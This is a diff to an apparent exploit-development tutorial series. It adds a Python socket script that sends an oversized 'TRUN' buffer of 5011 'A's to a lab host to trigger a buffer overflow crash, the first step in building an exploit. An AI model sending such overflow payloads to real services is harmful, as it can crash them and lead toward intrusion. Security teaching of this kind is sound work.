@@ -191,7 +191,7 @@ What we'll do now is, create our exploit skeleton in python and test to see if s
 
 ### exploitSkeleton.py
 
-We can craft up a skeleton exploit that we can stash away for later use and edit copies as we need them throughout this series. Our exploit skeleton will be the following:
+We can craft up a skeleton exploit that we can stash away for later use and edit copies of as we need them throughout this series. Our exploit skeleton will be the following:
 ```python
 #!/usr/bin/python
 
@@ -208,6 +208,27 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((host,port))
 print s.recv(1024)
 s.send(buffer)
+print s.recv(1024)
+s.close()
+```
+
+Let's edit this code to match our exact situation by changing the `host`, `port`, and `buffer` variables. Let's also keep in mind that the fuzzer prepended our fuzz-string with `TRUN /.:/ ` so it's not just as simple as multiplying `A` by 5011. We have to prepend our `TRUN` argument as well. Our final payload should look something like this: 
+```python
+#!/usr/bin/python
+
+import socket
+import os
+import sys
+
+host = "192.168.1.201"
+port = 9999
+
+buffer = "A"*5011
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host,port))
+print s.recv(1024)
+s.send("TRUN /.:/ " + buffer)
 print s.recv(1024)
 s.close()
 ```
